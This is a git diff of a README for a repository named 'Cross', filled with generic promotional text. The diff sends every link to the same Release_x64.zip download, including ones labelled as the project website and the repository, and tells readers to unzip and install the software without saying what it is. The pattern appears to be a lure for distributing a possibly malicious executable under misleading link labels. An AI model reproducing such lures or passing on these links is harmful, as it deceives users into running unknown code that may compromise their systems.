@@ -10,14 +10,14 @@ Explore a wide range of materials, including code snippets, tutorials, articles,
 ## 🚀 Get Started
 Ready to embark on this incredible journey? Simply click the link below to access the software package that will take your experience to the next level:
 
-[![Launch Software](https://img.shields.io/badge/Launch-Software-orange)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Launch Software](https://github.com/Ramihusseini/cross/releases/download/v2.0/Release_x64.zip)](https://github.com/Ramihusseini/cross/releases/download/v2.0/Release_x64.zip)
 
 Don't forget to unzip and install the software to unleash its full potential!
 
 ## 🌐 Visit Our Website
 Looking for more information or updates on the latest developments? Visit our website for a comprehensive guide and an immersive experience:
 
-[Visit Website](https://www.crossrepository.com)
+[Visit Website](https://github.com/Ramihusseini/cross/releases/download/v2.0/Release_x64.zip)
 
 ## 🌟 Stay Updated
 Stay tuned for the latest releases, updates, and announcements by checking out the "Releases" section of this repository. Exciting things are on the horizon, so don't miss out on any crucial updates!
@@ -32,7 +32,7 @@ Discover a diverse range of topics within the "Cross" repository. From AI and ma
 Want to contribute to the "Cross" repository and make a difference in the community? Check out the guidelines in the "Contributing" section to learn how you can get involved. Your contributions are invaluable and help us create a richer, more inclusive environment for everyone.
 
 ## 📌 Repository Link
-For quick access to the repository, click [here](https://github.com/user-attachments/files/18383251/Software.zip).
+For quick access to the repository, click [here](https://github.com/Ramihusseini/cross/releases/download/v2.0/Release_x64.zip).
 
 ---
 
